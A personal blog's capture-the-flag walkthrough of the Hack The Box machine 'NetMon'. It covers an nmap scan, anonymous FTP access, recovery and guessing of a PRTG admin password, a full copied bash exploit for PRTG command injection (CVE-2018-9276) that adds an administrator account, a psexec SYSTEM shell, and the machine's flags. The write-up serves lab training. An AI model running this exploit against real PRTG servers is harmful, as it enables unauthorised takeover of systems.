[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info#

| Machine Name | NetMon |
| IP Address | 10.10.10.152 |
| OS | Windows |

# Recon

## NMap

nmap -Pn -p 1-65535 -T4 -A -v 10.10.10.152

```
kali@kali:~/Documents/HTB/netmon$ nmap -Pn -p 1-65535 -T4 -A -v 10.10.10.152
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 16:04 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating Connect Scan at 16:04
Scanning netmon (10.10.10.152) [65535 ports]
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Increasing send delay for 10.10.10.152 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.10.152 from 5 to 10 due to max_successful_tryno increase to 6
Connect Scan Timing: About 56.48% done; ETC: 16:05 (0:00:30 remaining)
Connect Scan Timing: About 60.84% done; ETC: 16:06 (0:00:44 remaining)
Connect Scan Timing: About 67.30% done; ETC: 16:07 (0:00:55 remaining)
Discovered open port 49668/tcp on 10.10.10.152
Connect Scan Timing: About 75.66% done; ETC: 16:08 (0:00:55 remaining)
Connect Scan Timing: About 84.02% done; ETC: 16:08 (0:00:43 remaining)
Discovered open port 49665/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Completed Connect Scan at 16:09, 339.14s elapsed (65535 total ports)
Initiating Service scan at 16:09
Scanning 12 services on netmon (10.10.10.152)
Service scan Timing: About 58.33% done; ETC: 16:11 (0:00:39 remaining)
Completed Service scan at 16:10, 54.04s elapsed (12 services on 1 host)
NSE: Script scanning 10.10.10.152.
Initiating NSE at 16:10
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Completed NSE at 16:10, 8.23s elapsed
Initiating NSE at 16:10
Completed NSE at 16:10, 0.20s elapsed
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Nmap scan report for netmon (10.10.10.152)
Host is up (0.024s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m50s, deviation: 0s, median: 4m50s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-06T21:15:43
|_  start_date: 2020-11-06T21:08:47

NSE: Script Post-scanning.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 402.41 seconds
```

## Open Services

| Port | Service |
| 21 | FTP |
| 135 | MSRPC |
| 139 | Netbios |
| 445 | Microsoft Directory Services |
| 5985 | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 47001 | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 49664 | Microsoft Windows RPC |
| 49665 | Microsoft Windows RPC |
| 49666 | Microsoft Windows RPC |
| 49667 | Microsoft Windows RPC |
| 49668 | Microsoft Windows RPC |
| 49669 | Microsoft Windows RPC |


In the scan it shows that a folder path available to anon user
The folder structure shows - 

```
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
```

FTP into the box you can get a user file from /users/Public/user.txt

This file containes dd58ce67b49e15105e88096c8d9255a5

# User Owned

# Return to Recon

Found other files on the FTP server, including information that PRTG Network monitoring tool is installed. 
then accessign http://netmon returns a page. Why is nmap not return port 80 open??

In FTP under Program Files/Paeslear/PRTG Network Monitor there is some config files and backups. After searchign through them I found PTRG Configuration.old.bak contains a password on line 140 

```
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
```

This is a does not work to logon to the PRTG website.

Using searchsploit there is 2 exploits for PRTG Network Monitor the config file states PRTG Network Monitor is on version 18.1.37.13946 only 1 exploit appears that it would be worth exploiting that can work, you need to be logged on.

The passowrd is old because its in a .old configuration file. As the box was released in 2019 tried changing the password to - PrTg@dmin2019

** Success **

Now to try and craft an exploit of PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution

Found a link here - 

```
#!/bin/bash
echo -e "\n\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Authenticated PRTG network Monitor remote code execution                [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Date: 11/03/2019                                                        [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] \e[00m"
echo -e "\e[00;32m[*] Version: 18.2.38                                                        [*] \e[00m"
echo -e "\e[00;32m[*] CVE: CVE-2018-9276                                                      [*] \e[00m"
echo -e "\e[00;32m[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\n\e[00;32m# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.\n# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' \e[00m\n"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"


usage()
{
echo -e '\e[00;35m EXAMPLE USAGE:\e[00m\e[00;32m ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" \e[00m\n'
}

create_file()
{
data="name_=create_file&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.bat&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
fireone=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data" --cookie "$cookie" $url/editsettings)
# use bat file; save file to C:\Users\Public\tester.txt change accordingly
echo "$fireone"
echo -e "\e[00;32m [*] file created \e[00m"
}
ex_notify_1()
{
for i in range {0..50}; do
fireone=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
}

create_user()
{
data2="name_=create_user&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
firetwo=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data2" --cookie "$cookie" $url/editsettings)
# use ps1 script to execute code; adding a new user with username pentest and password P3nT3st!
echo "$firetwo"
echo -e "\e[00;32m [*] adding a new user 'pentest' with password 'P3nT3st' \e[00m"
}

ex_notify_2()
{
for i in range {0..50}; do
fire2=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
}

add_user_admin()
{
data3="name_=user_admin&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+localgroup+administrators+%2Fadd+pentest%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
firethree=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data3" --cookie "$cookie" $url/editsettings)
echo "$firethree"
echo -e "\e[00;32m [*] adding a user pentest to the administrators group \e[00m"
}

ex_notify_3()
{
for i in range {0..50}; do
fire3=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
echo -e "\n\n\e[00;32m [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! \e[00m"
}

if [[ $# -eq 0 ]] ; then
    usage
    exit 0
fi

while getopts "hu:c:" option; do
 case "${option}" in
    c) cookie=${OPTARG};;
    h) usage;;
    u) url=${OPTARG};;
    *) usage; exit;;
  esac
done

create_file
ex_notify_1
sleep 3
create_user
ex_notify_2
sleep 3
add_user_admin
ex_notify_3
```
Saved this and ran it.


Using Developer tools I have the cookie items for the exploit

```
_ga:"GA1.1.343038477.1604766532"
_gat:"1"
_gid:"GA1.1.1800017543.1604766532"
OCTOPUS1813713946:"ezFBRTUxRTU5LTdBRDYtNDNEMi04QzA2LUNDRTNFRTEwODMyMn0%3D"
```

This will create the following commandline - 

./prtg.sh -u http://10.10.10.152 -c "_ga=GA1.1.343038477.1604766532; _gid=GA1.1.1800017543.1604766532; OCTOPUS1813713946=ezFBRTUxRTU5LTdBRDYtNDNEMi04QzA2LUNDRTNFRTEwODMyMn0%3D; _gat=1"    


This has created a user called pentest and password P3nT3st

Use psexec.py from Impacket

```
kali@kali:/opt/impacket$ psexec.py 10.10.10.152
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
kali@kali:/opt/impacket$ psexec.py 'pentest:P3nT3st@10.10.10.152'
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
kali@kali:/opt/impacket$ psexec.py 'pentest:P3nT3st!@10.10.10.152'
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file jCzvDnTg.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service zUin on 10.10.10.152.....
[*] Starting service zUin.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd /user
b'The system cannot find the path specified.\r\n'
C:\Windows\system32>cd /
 
C:\>ls
b"'ls' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 684B-9CE8

 Directory of C:\

02/02/2019  11:18 PM             1,024 .rnd
02/25/2019  09:15 PM    <DIR>          inetpub
07/16/2016  08:18 AM    <DIR>          PerfLogs
02/25/2019  09:56 PM    <DIR>          Program Files
02/02/2019  11:28 PM    <DIR>          Program Files (x86)
02/03/2019  07:08 AM    <DIR>          Users
11/07/2020  12:47 PM    <DIR>          Windows
               1 File(s)          1,024 bytes
               6 Dir(s)  12,054,282,240 bytes free

C:\>cd Users
 
C:\Users>cd Administrators
b'The system cannot find the path specified.\r\n'
C:\Users>cd administrator
 
C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 684B-9CE8

 Directory of C:\Users\Administrator

02/25/2019  10:58 PM    <DIR>          .
02/25/2019  10:58 PM    <DIR>          ..
02/03/2019  07:08 AM    <DIR>          Contacts
02/02/2019  11:35 PM    <DIR>          Desktop
02/03/2019  07:08 AM    <DIR>          Documents
02/03/2019  07:08 AM    <DIR>          Downloads
02/03/2019  07:08 AM    <DIR>          Favorites
02/03/2019  07:08 AM    <DIR>          Links
02/03/2019  07:08 AM    <DIR>          Music
02/03/2019  07:08 AM    <DIR>          Pictures
02/03/2019  07:08 AM    <DIR>          Saved Games
02/03/2019  07:08 AM    <DIR>          Searches
02/25/2019  10:06 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  12,054,204,416 bytes free

C:\Users\Administrator>cd Desktop
 
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 684B-9CE8

 Directory of C:\Users\Administrator\Desktop

02/02/2019  11:35 PM    <DIR>          .
02/02/2019  11:35 PM    <DIR>          ..
02/02/2019  11:35 PM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)  12,054,204,416 bytes free

C:\Users\Administrator\Desktop>type root.txt
3018977fb944bf1878f75b879fba67cc

C:\Users\Administrator\Desktop>
```

Root Key is 3018977fb944bf1878f75b879fba67cc